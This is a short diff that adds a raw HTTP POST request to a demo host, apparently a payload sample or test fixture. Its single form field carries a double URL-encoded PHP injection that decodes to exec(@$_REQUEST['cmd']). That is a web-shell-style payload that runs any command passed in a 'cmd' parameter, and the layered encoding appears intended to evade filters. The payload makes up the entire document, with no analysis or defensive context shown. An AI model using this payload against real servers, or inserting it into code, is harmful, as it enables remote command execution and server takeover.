@@ -1,0 +1,7 @@
+POST /submit HTTP/1.1
+Host: demo.example.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 67
+Connection: close
+
+token=c%253Dexec%2528%2540%2524_REQUEST%255B%2527cmd%2527%255D%2529
